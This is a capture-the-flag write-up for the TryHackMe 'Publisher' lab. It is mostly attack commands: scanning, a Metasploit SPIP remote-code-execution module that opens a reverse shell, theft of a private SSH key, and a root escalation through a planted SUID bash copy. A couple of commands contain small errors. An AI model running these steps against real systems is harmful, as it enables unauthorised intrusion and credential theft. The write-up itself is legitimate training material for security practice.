# Publisher - [TryHackMe](https://tryhackme.com/room/publisher) Writeup 👑

## Introduction
Explore a vulnerable SPIP-based web application to gain initial access through a known RCE vulnerability. Escalate privileges using weak SSH key management and exploit AppArmor misconfigurations to become root.

## Scanning
```python
nmap -A 10.10.41.41
```
Ports found:
```python
22/tcp – SSH (tcpwrapped).
80/tcp – HTTP. Server: Apache/2.4.41. Page title: “Publisher's Pulse: SPIP Insights & Tips”.
```
## Directory Bruteforce
```python
gobuster dir -u 10.10.41.41 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt
```
Found:
```python
/spip (301)
```
Using Wappalyzer, we identified:
```python
SPIP CMS v4.2.0
```
## Exploitation
Using msfconsole:
```python
search spip
```
Exploit found:
```python
exploit/multi/http/spip_rce_form
```
Configure and run:
```python
use exploit/multi/http/spip_rce_form
set LHOST <your IP>
set RHOSTS 10.10.41.41
set TARGETURI /spip
exploit
```
Get a reverse shell.
```python
cd /home/think
cat user.txt
```
## Upgrading the shell
Extract private key:
```python
cd .ssh
cat id_rsa
```
On your machine:
```python
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa think@10.10.41.41
```
## Privilege Escalation
Hint suggests looking at AppArmor:
```python
cd /etc/apparmorls
ls -la /bin/bash
```
If unrestricted, use:
```python
cd /dev/shm
cp /bin/bash .
./bash -p
```
In /opt, replace the script:
```python
cat << EOF > run_container.sh
#!/bin/bash
cp /bin/bash /tmp/default
chmod +s /tmp/default
EOF
```
```python
run_container
cd /tmp
./default -p
```
## Root
```python
cat /root/root.txt
```

Great! You've gained full root access by chaining together web exploitation, SSH key abuse, and exiting the container via AppArmor misconfiguration. A solid task to practice real-world post-exploit techniques.
